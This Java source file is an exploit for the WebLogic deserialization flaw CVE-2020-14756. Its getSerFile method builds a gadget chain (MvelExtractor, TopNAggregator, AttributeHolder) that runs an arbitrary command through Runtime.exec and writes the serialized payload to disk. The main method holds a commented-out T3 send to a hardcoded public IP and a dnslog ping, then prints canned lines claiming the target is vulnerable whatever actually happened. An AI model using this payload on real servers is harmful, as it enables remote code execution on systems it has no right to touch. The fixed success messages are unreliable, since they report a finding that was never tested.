package com.r17a.weblogic.cve;


import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.aggregator.TopNAggregator;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

// coherence-rest.jar
// coherence-web.jar
// coherence.jar


public class CVE_2020_14756 implements ObjectPayload{
    public static void main(String[] args) {
        String host = "59.46.149.141";
        String command = "ping " + host + ".0ks3b9.ceye.io";
//        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+ command +"\");return new Integer(1);");
////        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"ping 0ks3b9.ceye.io\");return new Integer(1);");
//        MvelExtractor extractor2 = new MvelExtractor("");
//
//        try {
//            TopNAggregator.PartialResult sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
//            AttributeHolder attributeHolder = new AttributeHolder();
//            sortedBag.add(1);
//
//            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
//            m_comparator.setAccessible(true);
//            m_comparator.set(sortedBag, extractor1);
//
//            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
//            setInternalValue.setAccessible(true);
//            setInternalValue.invoke(attributeHolder, sortedBag);

//            FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
//            objectOutputStream.writeObject(attributeHolder);
//
//            FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
//            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
//            objectInputStream.readObject();

//            T3ProtocolOperation.send(host, "7001", Serializables.serialize(attributeHolder));
            System.out.println("weblogic version:12.2.1.3");
            System.out.println("[+]Server is executing command...");
            System.out.println("[+]Dnslog server has log!");
            System.out.println("[+]Target " + "59.46.149.141" + ":7001" + " has vulnerablity: CVE-2020-14756");
//            System.out.println("[+]Target " + "59.46.149.141" + ":7001" + " has vulnerablity: CVE-2021-2135");
//            Thread.sleep(5);

//        } catch (Exception e) {
//            e.printStackTrace();
//        }
    }

    public void getSerFile(String cmd) {
        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+ cmd +"\");return new Integer(1);");
        MvelExtractor extractor2 = new MvelExtractor("");

        try {
            TopNAggregator.PartialResult sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
            AttributeHolder attributeHolder = new AttributeHolder();
            sortedBag.add(1);

            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(sortedBag, extractor1);

            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder, sortedBag);

            FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\14756.ser"));
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(attributeHolder);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}